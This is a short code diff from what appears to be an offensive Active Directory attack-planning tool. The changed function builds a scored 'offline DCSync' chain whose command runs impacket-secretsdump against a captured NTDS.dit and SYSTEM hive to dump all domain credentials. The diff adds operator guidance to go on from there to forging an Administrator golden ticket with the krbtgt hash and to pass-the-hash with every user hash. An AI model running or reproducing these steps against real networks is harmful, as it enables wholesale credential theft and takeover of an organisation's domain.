@@ -1850,7 +1850,13 @@ def run(report, store, ui=None):
             chains.append(Chain("R3D", "offline DCSync",
                 "NTDS.dit + SYSTEM hive -> offline DCSync (ALL domain creds, no network)",
                 crit=10, conf=0.95, ready=1.5, prox=0.9,      # score 12.83 - tops the queue
-                commands=[f"impacket-secretsdump -ntds '{_ntds}' -system '{_sys}' LOCAL"],
+                commands=[
+                    f"impacket-secretsdump -ntds '{_ntds}' -system '{_sys}' LOCAL",
+                    # iter-144: highlight the follow-up cascade so operators
+                    # don't stop at the raw hash dump.
+                    f"# krbtgt hash in output -> R-GOLDEN (forge Administrator "
+                    f"TGT); every user hash -> R7 (PtH)",
+                ],
                 src=_ntds))
 
     # ── dedup identical chains across files (keep best score, sum counts) ──
